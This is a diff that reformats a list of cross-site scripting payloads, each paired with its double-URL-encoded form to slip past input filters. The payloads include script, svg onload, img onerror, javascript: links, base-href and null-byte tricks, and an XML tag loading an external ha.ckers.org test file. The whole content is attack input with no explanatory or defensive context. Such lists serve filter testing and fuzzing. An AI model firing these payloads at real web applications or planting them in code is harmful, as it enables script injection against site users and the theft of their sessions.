@@ -1,30 +1,21 @@
-Original     :: <XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
-2xURL ENcoded:: %253CXML%2520SRC%253D%2522http%253A%252F%252Fha.ckers.org%252Fxsstest.xml%2522%2520ID%253DI%253E%253C%252FXML%253E
-
-Original     :: <?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
-2xURL ENcoded:: %253C%253Fxml-stylesheet%2520type%253D%2522text%252Fcss%2522%253F%253E%253Croot%2520style%253D%2522x%253Aexpression%2528write%25281%2529%2529%2522%252F%253E
-
-Original     :: <svg onload="confirm(7)">
-2xURL ENcoded:: %253Csvg%2520onload%253D%2522confirm%25287%2529%2522%253E
-
-Original     :: >"<>"<script>confirm(1)</script>
-2xURL ENcoded:: %253E%2522%253C%253E%2522%253Cscript%253Econfirm%25281%2529%253C%252Fscript%253E
-
-Original     :: <math><a/xlink:href=javascript&colon;confirm&lpar;1&rpar;>click
-2xURL ENcoded:: %253Cmath%253E%253Ca%252Fxlink%253Ahref%253Djavascript%2526colon%253Bconfirm%2526lpar%253B1%2526rpar%253B%253Eclick
-
-Original     :: <!-- `<img/src=xx:xx onerror=alert(1)//--!>
-2xURL ENcoded:: %253C%2521--%2520%2560%253Cimg%252Fsrc%253Dxx%253Axx%2520onerror%253Dalert%25281%2529%252F%252F--%2521%253E
-
-Original     :: <!-- `<? foo="><script>confirm(1)</script>">
-2xURL ENcoded:: %253C%2521--%2520%2560%253C%253F%2520foo%253D%2522%253E%253Cscript%253Econfirm%25281%2529%253C%252Fscript%253E%2522%253E
-
-Original     :: <%00/title>
-2xURL ENcoded:: %253C%252500%252Ftitle%253E
-
-Original     :: <base href="javascript:\"> <a href="//%00confirm(2);//">XSS</a>
-2xURL ENcoded:: %253Cbase%2520href%253D%2522javascript%253A%255C%2522%253E%2520%253Ca%2520href%253D%2522%252F%252F%252500confirm%25282%2529%253B%252F%252F%2522%253EXSS%253C%252Fa%253E
-
-Original     :: <script>confirm(9)</script>
-2xURL ENcoded:: %253Cscript%253Econfirm%25289%2529%253C%252Fscript%253E
+<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+%253CXML%2520SRC%253D%2522http%253A%252F%252Fha.ckers.org%252Fxsstest.xml%2522%2520ID%253DI%253E%253C%252FXML%253E
+<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
+%253C%253Fxml-stylesheet%2520type%253D%2522text%252Fcss%2522%253F%253E%253Croot%2520style%253D%2522x%253Aexpression%2528write%25281%2529%2529%2522%252F%253E
+<svg onload="confirm(7)">
+%253Csvg%2520onload%253D%2522confirm%25287%2529%2522%253E
+>"<>"<script>confirm(1)</script>
+%253E%2522%253C%253E%2522%253Cscript%253Econfirm%25281%2529%253C%252Fscript%253E
+<math><a/xlink:href=javascript&colon;confirm&lpar;1&rpar;>click
+%253Cmath%253E%253Ca%252Fxlink%253Ahref%253Djavascript%2526colon%253Bconfirm%2526lpar%253B1%2526rpar%253B%253Eclick
+<!-- `<img/src=xx:xx onerror=alert(1)//--!>
+%253C%2521--%2520%2560%253Cimg%252Fsrc%253Dxx%253Axx%2520onerror%253Dalert%25281%2529%252F%252F--%2521%253E
+<!-- `<? foo="><script>confirm(1)</script>">
+%253C%2521--%2520%2560%253C%253F%2520foo%253D%2522%253E%253Cscript%253Econfirm%25281%2529%253C%252Fscript%253E%2522%253E
+<%00/title>
+%253C%252500%252Ftitle%253E
+<base href="javascript:\"> <a href="//%00confirm(2);//">XSS</a>
+%253Cbase%2520href%253D%2522javascript%253A%255C%2522%253E%2520%253Ca%2520href%253D%2522%252F%252F%252500confirm%25282%2529%253B%252F%252F%2522%253EXSS%253C%252Fa%253E
+<script>confirm(9)</script>
+%253Cscript%253Econfirm%25289%2529%253C%252Fscript%253E
 
